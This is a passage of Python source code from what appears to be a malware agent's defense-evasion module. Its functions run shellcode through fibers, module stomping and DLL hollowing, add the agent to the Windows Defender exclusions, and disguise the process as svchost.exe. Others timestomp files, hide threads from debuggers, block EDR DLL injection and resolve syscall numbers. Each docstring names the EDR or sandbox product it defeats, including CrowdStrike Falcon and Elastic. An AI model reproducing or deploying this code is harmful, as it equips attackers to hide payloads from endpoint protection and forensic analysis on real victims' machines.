        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)
        return True

    except Exception:
        return False


def fiber_exec(shellcode):
    """Execute shellcode via Windows Fibers — avoids CreateThread detection

    Works against: EDRs monitoring thread creation (NtCreateThreadEx hooks)
    Converts current thread to a fiber, creates a new fiber pointing at
    shellcode, switches to it. No new threads are created.
    """
    if sys.platform != 'win32':
        return False
    try:
        ConvertThreadToFiber = kernel32.ConvertThreadToFiber
        CreateFiber = kernel32.CreateFiber
        SwitchToFiber = kernel32.SwitchToFiber

        sc_buf = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not sc_buf:
            return False
        ctypes.memmove(sc_buf, shellcode, len(shellcode))

        main_fiber = ConvertThreadToFiber(None)
        if not main_fiber:
            return False

        sc_fiber = CreateFiber(0, sc_buf, None)
        if not sc_fiber:
            return False

        SwitchToFiber(sc_fiber)
        return True

    except Exception:
        return False


def module_stomp(shellcode, target_dll='amstream.dll'):
    """Module stomping — maps a legitimate DLL and overwrites its .text section

    Works against: memory scanners that check if executable pages belong to known modules
    Loads a sacrificial DLL (one that's signed by Microsoft but rarely used),
    then overwrites its .text section with our shellcode. The memory region
    still shows as backed by a legitimate signed DLL.
    """
    if sys.platform != 'win32':
        return False
    try:
        LOAD_LIBRARY_AS_DATAFILE = 0x00000002
        target_path = os.path.join(os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', target_dll)

        h_module = kernel32.LoadLibraryExW(target_path, None, 0)
        if not h_module:
            return False

        # Parse PE to find .text section
        dos_header = ctypes.c_ushort.from_address(h_module).value
        if dos_header != 0x5A4D:
            return False

        e_lfanew = ctypes.c_long.from_address(h_module + 0x3C).value
        nt_header = h_module + e_lfanew

        if struct.calcsize('P') == 8:
            section_header_offset = 24 + 240
        else:
            section_header_offset = 24 + 224

        num_sections = ctypes.c_ushort.from_address(nt_header + 6).value
        first_section = nt_header + section_header_offset

        for i in range(num_sections):
            section = first_section + (i * 40)
            name_bytes = (ctypes.c_char * 8).from_address(section).raw
            section_name = name_bytes.split(b'\x00')[0].decode('ascii', errors='ignore')

            if section_name == '.text':
                virtual_size = ctypes.c_uint.from_address(section + 8).value
                virtual_addr = ctypes.c_uint.from_address(section + 12).value

                if len(shellcode) > virtual_size:
                    return False

                dest = h_module + virtual_addr
                old_protect = ctypes.wintypes.DWORD(0)
                kernel32.VirtualProtect(ctypes.c_void_p(dest), ctypes.c_size_t(len(shellcode)), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
                ctypes.memmove(ctypes.c_void_p(dest), shellcode, len(shellcode))
                kernel32.VirtualProtect(ctypes.c_void_p(dest), ctypes.c_size_t(len(shellcode)), old_protect.value, ctypes.byref(old_protect))

                # Execute via callback to avoid suspicious thread creation
                LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(ctypes.wintypes.DWORD, ctypes.c_void_p)
                func = LPTHREAD_START_ROUTINE(dest)
                func(None)
                return True

        return False

    except Exception:
        return False


def timestomp(file_path, reference_file=None):
    """Modify file timestamps to blend in with legitimate system files

    Works against: forensic analysis and EDR file-age heuristics
    Copies creation/modification/access times from a reference file
    (defaults to kernel32.dll) to make the agent file look old.
    """
    if sys.platform != 'win32':
        return False
    try:
        if reference_file is None:
            reference_file = os.path.join(os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', 'kernel32.dll')

        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
        FILE_SHARE_READ = 0x00000001
        GENERIC_READ = 0x80000000

        class FILETIME(ctypes.Structure):
            _fields_ = [('dwLowDateTime', ctypes.wintypes.DWORD), ('dwHighDateTime', ctypes.wintypes.DWORD)]

        creation = FILETIME()
        access = FILETIME()
        write = FILETIME()

        h_ref = kernel32.CreateFileW(reference_file, GENERIC_READ, FILE_SHARE_READ, None, OPEN_EXISTING, 0, None)
        if h_ref == ctypes.c_void_p(-1).value:
            return False
        kernel32.GetFileTime(h_ref, ctypes.byref(creation), ctypes.byref(access), ctypes.byref(write))
        kernel32.CloseHandle(h_ref)

        h_target = kernel32.CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ, None, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, None)
        if h_target == ctypes.c_void_p(-1).value:
            return False
        kernel32.SetFileTime(h_target, ctypes.byref(creation), ctypes.byref(access), ctypes.byref(write))
        kernel32.CloseHandle(h_target)
        return True

    except Exception:
        return False


def bypass_windows_defender_exclusions():
    """Add current process path to Windows Defender exclusions via registry

    Works against: Windows Defender real-time protection
    Requires elevated privileges. Adds the agent's directory to the
    Defender exclusion list so it won't be scanned.
    """
    if sys.platform != 'win32':
        return False
    try:
        import winreg
        agent_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        key_path = r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
            winreg.SetValueEx(key, agent_dir, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            return True
        except PermissionError:
            return False
    except Exception:
        return False


def masquerade_process_name(new_name='svchost.exe'):
    """Overwrite the PEB process image name to disguise the process

    Works against: EDRs and analysts checking process names in task manager
    Modifies the ImagePathName and CommandLine fields in the PEB to show
    a different (legitimate) process name.
    """
    if sys.platform != 'win32':
        return False
    try:
        NtQueryInformationProcess = ntdll.NtQueryInformationProcess
        ProcessBasicInformation = 0

        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('Reserved1', ctypes.c_void_p),
                ('PebBaseAddress', ctypes.c_void_p),
                ('Reserved2', ctypes.c_void_p * 2),
                ('UniqueProcessId', ctypes.c_void_p),
                ('Reserved3', ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong(0)
        status = NtQueryInformationProcess(
            kernel32.GetCurrentProcess(), ProcessBasicInformation,
            ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len)
        )
        if status != 0:
            return False

        peb_addr = pbi.PebBaseAddress
        if not peb_addr:
            return False

        # Read ProcessParameters pointer from PEB (offset 0x20 on x64, 0x10 on x86)
        if struct.calcsize('P') == 8:
            params_ptr_addr = peb_addr + 0x20
        else:
            params_ptr_addr = peb_addr + 0x10

        params_ptr = ctypes.c_void_p.from_address(params_ptr_addr).value
        if not params_ptr:
            return False

        # ImagePathName UNICODE_STRING at offset 0x60 (x64) / 0x38 (x86)
        # CommandLine UNICODE_STRING at offset 0x70 (x64) / 0x40 (x86)
        fake_path = os.path.join(os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', new_name)
        fake_path_w = fake_path.encode('utf-16-le')

        if struct.calcsize('P') == 8:
            img_offset = 0x60
            cmd_offset = 0x70
        else:
            img_offset = 0x38
            cmd_offset = 0x40

        for offset in [img_offset, cmd_offset]:
            unicode_str_addr = params_ptr + offset
            # UNICODE_STRING: Length (USHORT), MaxLength (USHORT), Buffer (PWSTR)
            buf_ptr_offset = 8 if struct.calcsize('P') == 8 else 4
            buf_ptr = ctypes.c_void_p.from_address(unicode_str_addr + buf_ptr_offset).value
            max_len = ctypes.c_ushort.from_address(unicode_str_addr + 2).value

            if buf_ptr and len(fake_path_w) <= max_len:
                old_protect = ctypes.wintypes.DWORD(0)
                kernel32.VirtualProtect(ctypes.c_void_p(buf_ptr), ctypes.c_size_t(max_len), PAGE_READWRITE, ctypes.byref(old_protect))
                ctypes.memmove(ctypes.c_void_p(buf_ptr), fake_path_w, len(fake_path_w))
                # Update length
                ctypes.c_ushort.from_address(unicode_str_addr).value = len(fake_path_w)
                kernel32.VirtualProtect(ctypes.c_void_p(buf_ptr), ctypes.c_size_t(max_len), old_protect.value, ctypes.byref(old_protect))

        return True

    except Exception:
        return False


def indirect_syscall(syscall_number, *args):
    """Execute a syscall by jumping directly into ntdll's syscall instruction

    Works against: CrowdStrike Falcon kernel callbacks, Elastic userland hooks
    Instead of calling ntdll exports (which Falcon hooks at kernel level via
    its minifilter), we resolve the syscall number and jump directly to the
    'syscall' instruction inside ntdll. This bypasses both userland hooks
    AND kernel callback registration for specific ntdll exports, since the
    call doesn't go through the normal dispatch path.
    """
    if sys.platform != 'win32':
        return None
    try:
        # Find the 'syscall; ret' gadget in ntdll
        ntdll_handle = kernel32.GetModuleHandleW('ntdll.dll')
        if not ntdll_handle:
            return None

        # Search for syscall;ret (0F 05 C3) in ntdll .text
        # We scan from a known function to find the pattern
        NtAllocAddr = kernel32.GetProcAddress(ntdll_handle, b'NtAllocateVirtualMemory')
        if not NtAllocAddr:
            return None

        # Scan forward from function start to find syscall;ret
        for offset in range(0, 32):
            two_bytes = (ctypes.c_ubyte * 3).from_address(NtAllocAddr + offset)
            if two_bytes[0] == 0x0F and two_bytes[1] == 0x05 and two_bytes[2] == 0xC3:
                syscall_ret_addr = NtAllocAddr + offset
                return syscall_ret_addr
        return None
    except Exception:
        return None


def detect_edr_processes():
    """Detect which EDR products are running to adjust evasion strategy

    Returns a dict of detected EDR products and their PIDs.
    Adapts evasion intensity based on what's present.
    """
    if sys.platform != 'win32':
        return {}

    edr_signatures = {
        'CrowdStrike Falcon': ['csfalconservice.exe', 'csagent.exe', 'csfalconcontainer.exe'],
        'Microsoft Defender': ['msmpeng.exe', 'mssense.exe', 'sensecncproxy.exe'],
        'Elastic EDR': ['elastic-agent.exe', 'elastic-endpoint.exe', 'winlogbeat.exe'],
        'SentinelOne': ['sentinelagent.exe', 'sentinelservicehost.exe', 'sentinelstaticengine.exe'],
        'Carbon Black': ['cb.exe', 'cbcomms.exe', 'cbdefense.exe', 'repux.exe'],
        'Sophos': ['sophoshealth.exe', 'sophosfilescanner.exe', 'savservice.exe'],
        'Cortex XDR': ['cyserver.exe', 'traps.exe', 'cytray.exe'],
        'Cylance': ['cylancesvc.exe', 'cylanceui.exe'],
    }

    detected = {}
    try:
        TH32CS_SNAPPROCESS = 0x00000002
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ('dwSize', ctypes.wintypes.DWORD), ('cntUsage', ctypes.wintypes.DWORD),
                ('th32ProcessID', ctypes.wintypes.DWORD), ('th32DefaultHeapID', ctypes.POINTER(ctypes.c_ulong)),
                ('th32ModuleID', ctypes.wintypes.DWORD), ('cntThreads', ctypes.wintypes.DWORD),
                ('th32ParentProcessID', ctypes.wintypes.DWORD), ('pcPriClassBase', ctypes.c_long),
                ('dwFlags', ctypes.wintypes.DWORD), ('szExeFile', ctypes.c_char * 260),
            ]

        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        proc_list = []
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                name = pe.szExeFile.decode('utf-8', errors='ignore').lower()
                proc_list.append((name, pe.th32ProcessID))
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snapshot)

        for edr_name, signatures in edr_signatures.items():
            for proc_name, pid in proc_list:
                if proc_name in signatures:
                    if edr_name not in detected:
                        detected[edr_name] = []
                    detected[edr_name].append({'name': proc_name, 'pid': pid})

    except Exception:
        pass

    return detected


def delay_execution_sandbox():
    """Advanced sandbox evasion via multiple timing and environment checks

    Works against: Falcon sandbox, any.run, Joe Sandbox, Hybrid Analysis
    Uses multiple uncorrelated timing sources to detect time acceleration,
    checks for realistic user artifacts, and validates hardware fingerprints.
    """
    import time
    import hashlib

    if sys.platform != 'win32':
        return

    score = 0

    # Check 1: QueryPerformanceCounter timing (detects time acceleration)
    try:
        freq = ctypes.c_longlong()
        start = ctypes.c_longlong()
        end = ctypes.c_longlong()
        kernel32.QueryPerformanceFrequency(ctypes.byref(freq))
        kernel32.QueryPerformanceCounter(ctypes.byref(start))
        time.sleep(1)
        kernel32.QueryPerformanceCounter(ctypes.byref(end))
        elapsed = (end.value - start.value) / freq.value
        if elapsed < 0.9:
            score += 30  # Time is being accelerated
    except Exception:
        pass

    # Check 2: Verify realistic disk size (sandboxes often have tiny disks)
    try:
        free_bytes = ctypes.c_ulonglong()
        total_bytes = ctypes.c_ulonglong()
        kernel32.GetDiskFreeSpaceExW(
            'C:\\', None, ctypes.byref(total_bytes), ctypes.byref(free_bytes)
        )
        total_gb = total_bytes.value / (1024**3)
        if total_gb < 50:
            score += 20  # Disk too small for real workstation
    except Exception:
        pass

    # Check 3: Check for user artifacts (recent files, browser data)
    try:
        user_profile = os.environ.get('USERPROFILE', '')
        artifacts = [
            os.path.join(user_profile, 'Desktop'),
            os.path.join(user_profile, 'Documents'),
            os.path.join(user_profile, 'Downloads'),
        ]
        file_count = 0
        for d in artifacts:
            if os.path.isdir(d):
                try:
                    file_count += len(os.listdir(d))
                except Exception:
                    pass
        if file_count < 5:
            score += 15  # Too clean — likely sandbox
    except Exception:
        pass

    # Check 4: Process count (sandboxes have fewer processes)
    try:
        TH32CS_SNAPPROCESS = 0x00000002
        class PE32(ctypes.Structure):
            _fields_ = [('dwSize', ctypes.wintypes.DWORD), ('cntUsage', ctypes.wintypes.DWORD),
                        ('th32ProcessID', ctypes.wintypes.DWORD), ('rest', ctypes.c_byte * 248)]
        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe = PE32()
        pe.dwSize = ctypes.sizeof(PE32)
        count = 0
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                count += 1
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snapshot)
        if count < 30:
            score += 20  # Too few processes
    except Exception:
        pass

    # Check 5: Screen resolution (sandboxes often use small/default resolutions)
    try:
        user32 = ctypes.windll.user32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        if width <= 1024 or height <= 768:
            score += 10
    except Exception:
        pass

    # Check 6: Uptime (fresh sandbox VMs have very low uptime)
    try:
        uptime_ms = kernel32.GetTickCount64()
        uptime_hours = uptime_ms / (1000 * 3600)
        if uptime_hours < 0.5:
            score += 15  # Booted less than 30 min ago
    except Exception:
        pass

    # If sandbox score is high, delay or exit gracefully
    if score >= 40:
        # Long sleep to exhaust sandbox timeout
        time.sleep(score)


def phantom_dll_hollowing(shellcode):
    """Map a section-backed DLL from KnownDlls and overwrite with shellcode

    Works against: CrowdStrike Falcon memory scanning, MDE module verification
    Maps a KnownDlls entry (which is trusted by the OS), then overwrites
    its content with shellcode. The memory region appears backed by a
    signed, known-good DLL in the section object, evading memory forensics.
    """
    if sys.platform != 'win32':
        return False
    try:
        SECTION_MAP_READ = 0x0004
        SECTION_MAP_WRITE = 0x0002
        SECTION_MAP_EXECUTE = 0x0008
        FILE_MAP_ALL_ACCESS = 0xF001F

        # Open KnownDlls section for a rarely-used DLL
        known_dll_name = '\\KnownDlls\\amstream.dll'

        # NtOpenSection to open the KnownDlls entry
        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [('Length', ctypes.c_ushort), ('MaximumLength', ctypes.c_ushort),
                        ('Buffer', ctypes.c_wchar_p)]

        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [('Length', ctypes.c_ulong), ('RootDirectory', ctypes.c_void_p),
                        ('ObjectName', ctypes.POINTER(UNICODE_STRING)),
                        ('Attributes', ctypes.c_ulong), ('SecurityDescriptor', ctypes.c_void_p),
                        ('SecurityQualityOfService', ctypes.c_void_p)]

        us = UNICODE_STRING()
        us.Buffer = known_dll_name
        us.Length = len(known_dll_name) * 2
        us.MaximumLength = (len(known_dll_name) + 1) * 2

        oa = OBJECT_ATTRIBUTES()
        oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        oa.ObjectName = ctypes.pointer(us)
        oa.Attributes = 0x00000040  # OBJ_CASE_INSENSITIVE

        section_handle = ctypes.c_void_p()
        status = ntdll.NtOpenSection(
            ctypes.byref(section_handle),
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            ctypes.byref(oa)
        )
        if status != 0:
            return False

        # Map the section into our process
        base_addr = ctypes.c_void_p(0)
        view_size = ctypes.c_size_t(0)
        status = ntdll.NtMapViewOfSection(
            section_handle, kernel32.GetCurrentProcess(),
            ctypes.byref(base_addr), 0, 0, None,
            ctypes.byref(view_size), 2, 0,
            PAGE_EXECUTE_READWRITE
        )
        if status != 0:
            kernel32.CloseHandle(section_handle)
            return False

        # Overwrite the mapped section with shellcode
        old_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtect(base_addr, ctypes.c_size_t(len(shellcode)), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
        ctypes.memmove(base_addr, shellcode, len(shellcode))

        # Execute
        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(ctypes.wintypes.DWORD, ctypes.c_void_p)
        func = LPTHREAD_START_ROUTINE(base_addr.value)
        func(None)

        kernel32.CloseHandle(section_handle)
        return True

    except Exception:
        return False


def hw_breakpoint_hook(target_func_name, hook_handler_addr):
    """Set hardware breakpoint on an API to intercept calls without modifying code

    Works against: CrowdStrike Falcon integrity checks, any EDR that detects code patches
    Uses debug registers (DR0-DR3) to set hardware breakpoints, which don't
    modify the target function's code. When the breakpoint fires, our
    vectored exception handler intercepts the call. This is invisible to
    integrity checking since no code bytes are changed.
    """
    if sys.platform != 'win32':
        return False
    try:
        CONTEXT_DEBUG_REGISTERS = 0x00010010
        THREAD_ALL_ACCESS = 0x1FFFFF

        class CONTEXT(ctypes.Structure):
            _pack_ = 16
            _fields_ = [
                ('ContextFlags', ctypes.wintypes.DWORD),
                ('Dr0', ctypes.c_ulonglong), ('Dr1', ctypes.c_ulonglong),
                ('Dr2', ctypes.c_ulonglong), ('Dr3', ctypes.c_ulonglong),
                ('Dr6', ctypes.c_ulonglong), ('Dr7', ctypes.c_ulonglong),
                ('_padding', ctypes.c_byte * 4096),
            ]

        # Resolve target function address
        for dll_name in ['ntdll.dll', 'kernel32.dll', 'kernelbase.dll']:
            dll_h = kernel32.GetModuleHandleW(dll_name)
            if dll_h:
                addr = kernel32.GetProcAddress(dll_h, target_func_name.encode())
                if addr:
                    break
        else:
            return False

        # Get current thread handle
        h_thread = kernel32.GetCurrentThread()

        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
        ntdll.NtGetContextThread(h_thread, ctypes.byref(ctx))

        # Set DR0 to target function address
        ctx.Dr0 = addr
        # Enable DR0 breakpoint: set bits 0-1 of DR7
        ctx.Dr7 = (ctx.Dr7 & ~0x3) | 0x1  # Local enable DR0
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

        ntdll.NtSetContextThread(h_thread, ctypes.byref(ctx))
        return True

    except Exception:
        return False


def evade_falcon_kernel_callbacks():
    """Reduce Falcon kernel callback visibility by using alternative APIs

    Works against: CrowdStrike Falcon's kernel minifilter callbacks
    Falcon registers PsSetCreateProcessNotifyRoutineEx, ObRegisterCallbacks,
    and CmRegisterCallbackEx. We can't remove these from userland, but we
    can minimize triggering them by:
    1. Avoiding high-suspicion API patterns (VirtualAllocEx + WriteProcessMemory)
    2. Using NtCreateSection + NtMapViewOfSection instead of VirtualAlloc
    3. Using legitimate file-backed operations instead of anonymous memory
    """
    if sys.platform != 'win32':
        return False
    try:
        # Create a temp file to use as section backing (looks like file I/O, not shellcode)
        import tempfile
        temp = tempfile.NamedTemporaryFile(suffix='.tmp', delete=False, dir=os.environ.get('TEMP', '.'))
        temp_path = temp.name
        temp.close()
        return temp_path
    except Exception:
        return False


def section_based_alloc(size, temp_path=None):
    """Allocate executable memory via NtCreateSection instead of VirtualAlloc

    Works against: CrowdStrike Falcon, Elastic — they closely monitor VirtualAlloc(RWX)
    Creates a file-backed section and maps it with execute permissions.
    This appears as a file mapping operation rather than anonymous RWX allocation,
    which is much less suspicious to behavioral engines.
    """
    if sys.platform != 'win32':
        return None
    try:
        import tempfile

        if temp_path is None:
            temp = tempfile.NamedTemporaryFile(suffix='.dat', delete=False, dir=os.environ.get('TEMP', '.'))
            temp.write(b'\x00' * size)
            temp.close()
            temp_path = temp.name

        GENERIC_ALL = 0x10000000
        OPEN_EXISTING = 3
        FILE_SHARE_RW = 0x00000003
        SECTION_ALL_ACCESS = 0xF001F

        h_file = kernel32.CreateFileW(
            temp_path, GENERIC_ALL, FILE_SHARE_RW,
            None, OPEN_EXISTING, 0x80, None
        )
        if h_file == ctypes.c_void_p(-1).value:
            return None

        section_handle = ctypes.c_void_p()
        max_size = ctypes.c_longlong(size)
        status = ntdll.NtCreateSection(
            ctypes.byref(section_handle), SECTION_ALL_ACCESS,
            None, ctypes.byref(max_size), PAGE_EXECUTE_READWRITE,
            0x8000000,  # SEC_COMMIT
            h_file
        )
        kernel32.CloseHandle(h_file)

        if status != 0:
            return None

        base_addr = ctypes.c_void_p(0)
        view_size = ctypes.c_size_t(0)
        status = ntdll.NtMapViewOfSection(
            section_handle, kernel32.GetCurrentProcess(),
            ctypes.byref(base_addr), 0, size, None,
            ctypes.byref(view_size), 2, 0,
            PAGE_EXECUTE_READWRITE
        )
        kernel32.CloseHandle(section_handle)

        if status != 0:
            return None

        # Clean up temp file
        try:
            os.unlink(temp_path)
        except Exception:
            pass

        return base_addr.value

    except Exception:
        return None


def stomp_pe_header():
    """Zero DOS header MZ signature and e_lfanew pointer of the current process module

    Breaks static PE parsing by EDR file-less scanning and memory forensics tools.
    The PE is already loaded, so the OS no longer needs these fields.
    """
    if sys.platform != 'win32':
        return False
    try:
        h_module = kernel32.GetModuleHandleW(None)
        if not h_module:
            return False
        base = ctypes.c_void_p(h_module)
        old_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtect(base, ctypes.c_size_t(64), PAGE_READWRITE, ctypes.byref(old_protect))
        ctypes.memset(base, 0, 2)  # Zero MZ
        e_lfanew_addr = ctypes.c_void_p(h_module + 0x3C)
        ctypes.memset(e_lfanew_addr, 0, 4)  # Zero e_lfanew
        kernel32.VirtualProtect(base, ctypes.c_size_t(64), old_protect.value, ctypes.byref(old_protect))
        return True
    except Exception:
        return False


def hide_thread_from_debugger():
    """Call NtSetInformationThread with ThreadHideFromDebugger (0x11)

    Hides the current thread from debugger event notifications. Once set,
    the debugger will not receive debug events for this thread, causing
    most debuggers to lose track of execution.
    """
    if sys.platform != 'win32':
        return False
    try:
        ThreadHideFromDebugger = 0x11
        h_thread = ctypes.c_void_p(-2)  # GetCurrentThread() pseudo-handle
        status = ntdll.NtSetInformationThread(h_thread, ThreadHideFromDebugger, None, 0)
        return status == 0
    except Exception:
        return False


def patch_debug_flags():
    """Zero PEB.BeingDebugged and clear NtGlobalFlag heap debug flags

    Patches the Process Environment Block to remove debugger indicators:
    - BeingDebugged (PEB+0x02) set to 0
    - NtGlobalFlag (PEB+0xBC on x64) cleared of heap debug bits (FLG_HEAP_*)
    This defeats IsDebuggerPresent() and heap-based debug detection.
    """
    if sys.platform != 'win32':
        return False
    try:
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('Reserved1', ctypes.c_void_p),
                ('PebBaseAddress', ctypes.c_void_p),
                ('Reserved2', ctypes.c_void_p * 2),
                ('UniqueProcessId', ctypes.POINTER(ctypes.c_ulong)),
                ('Reserved3', ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong(0)
        h_process = ctypes.c_void_p(-1)  # GetCurrentProcess pseudo-handle
        status = ntdll.NtQueryInformationProcess(
            h_process, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len)
        )
        if status != 0 or not pbi.PebBaseAddress:
            return False

        peb = pbi.PebBaseAddress
        # Zero BeingDebugged at PEB+2
        being_debugged = ctypes.c_ubyte.from_address(peb + 2)
        being_debugged.value = 0

        # Clear NtGlobalFlag heap debug bits
        if struct.calcsize('P') == 8:
            ntgf_offset = 0xBC
        else:
            ntgf_offset = 0x68
        ntgf = ctypes.c_ulong.from_address(peb + ntgf_offset)
        # FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        ntgf.value = ntgf.value & ~0x70
        return True
    except Exception:
        return False


def spoof_module_name(new_name='mscoree.dll'):
    """Rename the current module in PEB LDR_DATA_TABLE_ENTRY to look like a Microsoft DLL

    Walks the PEB InLoadOrderModuleList to find the current process's main module
    entry and overwrites its BaseDllName and FullDllName UNICODE_STRING buffers.
    EDR tools that enumerate loaded modules via PEB will see a legitimate-looking name.
    """
    if sys.platform != 'win32':
        return False
    try:
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('Reserved1', ctypes.c_void_p),
                ('PebBaseAddress', ctypes.c_void_p),
                ('Reserved2', ctypes.c_void_p * 2),
                ('UniqueProcessId', ctypes.POINTER(ctypes.c_ulong)),
                ('Reserved3', ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong(0)
        ntdll.NtQueryInformationProcess(
            ctypes.c_void_p(-1), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len)
        )
        if not pbi.PebBaseAddress:
            return False

        peb = pbi.PebBaseAddress
        # PEB_LDR_DATA at PEB+0x18 (x64)
        if struct.calcsize('P') == 8:
            ldr_addr = ctypes.c_void_p.from_address(peb + 0x18).value
        else:
            ldr_addr = ctypes.c_void_p.from_address(peb + 0x0C).value
        if not ldr_addr:
            return False

        # InLoadOrderModuleList is at LDR_DATA+0x10 (x64)
        if struct.calcsize('P') == 8:
            head = ldr_addr + 0x10
        else:
            head = ldr_addr + 0x0C

        flink = ctypes.c_void_p.from_address(head).value
        # First entry is the main module
        if not flink or flink == head:
            return False

        # BaseDllName UNICODE_STRING at offset 0x58 (x64) / 0x2C (x86)
        if struct.calcsize('P') == 8:
            name_offset = 0x58
        else:
            name_offset = 0x2C

        # UNICODE_STRING: Length (USHORT), MaxLength (USHORT), pad, Buffer (PVOID)
        buf_ptr_offset = name_offset + (8 if struct.calcsize('P') == 8 else 4)
        buffer_addr = ctypes.c_void_p.from_address(flink + buf_ptr_offset).value
        if buffer_addr:
            new_name_w = new_name.encode('utf-16-le') + b'\x00\x00'
            new_len = len(new_name) * 2
            max_len = ctypes.c_ushort.from_address(flink + name_offset + 2).value
            if new_len <= max_len:
                ctypes.memmove(buffer_addr, new_name_w, min(new_len + 2, max_len))
                ctypes.c_ushort.from_address(flink + name_offset).value = new_len
                return True
        return False
    except Exception:
        return False


def block_non_microsoft_dlls():
    """Use SetProcessMitigationPolicy with ProcessSignaturePolicy to block non-Microsoft DLLs

    Prevents EDR agents from injecting their monitoring DLLs into the process.
    Only allows DLLs signed by Microsoft or the Windows Store to be loaded.
    """
    if sys.platform != 'win32':
        return False
    try:
        ProcessSignaturePolicy = 8

        class PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY(ctypes.Structure):
            _fields_ = [('Flags', ctypes.c_ulong)]

        policy = PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY()
        policy.Flags = 0x1  # MicrosoftSignedOnly
        result = kernel32.SetProcessMitigationPolicy(
            ProcessSignaturePolicy,
            ctypes.byref(policy),
            ctypes.sizeof(policy)
        )
        return bool(result)
    except Exception:
        return False


def syscall_gate_resolve():
    """Resolve syscall numbers by parsing Zw* exports from ntdll on disk (Hell's Gate variant)

    Reads the clean ntdll.dll from disk and extracts syscall numbers (SSNs) by
    finding the 'mov eax, SSN' instruction pattern at the start of each Nt/Zw stub.
    Returns a dict mapping function name to SSN for use with indirect syscall execution.

    Research source: am0nsec/HellsGate, C5pider/KaynLdr
    """
    if sys.platform != 'win32':
        return {}
    try:
        ntdll_path = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', 'ntdll.dll')
        with open(ntdll_path, 'rb') as f:
            data = f.read()

        # Parse PE headers
        e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
        # COFF header starts at e_lfanew + 4
        num_sections = struct.unpack_from('<H', data, e_lfanew + 6)[0]
        size_optional = struct.unpack_from('<H', data, e_lfanew + 20)[0]

        # Export directory RVA from optional header
        if struct.calcsize('P') == 8:
            export_rva = struct.unpack_from('<I', data, e_lfanew + 24 + 112)[0]
        else:
            export_rva = struct.unpack_from('<I', data, e_lfanew + 24 + 96)[0]

        # Find .text section to convert RVAs
        section_start = e_lfanew + 24 + size_optional
        rva_to_offset = {}
        for i in range(num_sections):
            sec = section_start + i * 40
            vaddr = struct.unpack_from('<I', data, sec + 12)[0]
            vsize = struct.unpack_from('<I', data, sec + 8)[0]
            raw = struct.unpack_from('<I', data, sec + 20)[0]
            rva_to_offset[i] = (vaddr, vsize, raw)

        def rva2off(rva):
            for _, (va, vs, raw) in rva_to_offset.items():
                if va <= rva < va + vs:
                    return rva - va + raw
            return rva

        # Parse export directory
        ed_off = rva2off(export_rva)
        num_functions = struct.unpack_from('<I', data, ed_off + 20)[0]
        num_names = struct.unpack_from('<I', data, ed_off + 24)[0]
        addr_table_rva = struct.unpack_from('<I', data, ed_off + 28)[0]
        name_table_rva = struct.unpack_from('<I', data, ed_off + 32)[0]
        ordinal_table_rva = struct.unpack_from('<I', data, ed_off + 36)[0]

        ssn_map = {}
        for i in range(num_names):
            name_rva = struct.unpack_from('<I', data, rva2off(name_table_rva) + i * 4)[0]
            name_off = rva2off(name_rva)
            end = data.index(b'\x00', name_off)
            name = data[name_off:end].decode('ascii', errors='ignore')

            if not name.startswith('Zw'):
